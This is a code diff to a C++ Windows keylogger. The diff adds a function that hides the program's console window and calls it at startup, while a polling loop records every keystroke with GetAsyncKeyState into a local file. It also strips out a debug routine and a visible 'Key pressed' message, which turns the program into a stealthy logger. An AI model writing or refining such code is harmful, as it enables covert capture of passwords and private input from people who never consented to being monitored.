@@ -11,21 +11,18 @@
 
 using namespace std;
 
-//void debug() {
-//	char ascii;
-//	while (1) {
-//		cin >> ascii;
-//		cout << endl << "Entered character was : " << ascii << " : "
-//				<< (int) ascii << endl;
-//	}
-//}
+void hide() {
+	HWND stealth;
+	AllocConsole();
+	stealth = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(stealth, 0);
+}
 
 void log() {
 	char key;
 	while (1) {
 		for (key = 8; key <= 222; key++) {
 			if (GetAsyncKeyState(key) == -32767) {
-				cout << "Key pressed";
 				ofstream write("Record.txt", ios::app);
 
 				if ((key > 64) && (key < 91) && !(GetAsyncKeyState(0x10))) {
@@ -157,22 +154,13 @@ void log() {
 						break;
 					}
 				}
-//				switch(key) {
-//				case 8: write << "<backspace>"; break;
-//				case 9: write << "<tab>"; break;
-//				case 27: write << "<esc>"; break;
-//				case 127: write << "<del>"; break;
-//				case 32: write << " "; break;
-//				case 13: write << "<enter>\n"; break;
-//				default: write << key;
-//				}
 			}
 		}
 	}
 }
 
 int main() {
+	hide();
 	log();
-//	debug();
 	return 0;
 }
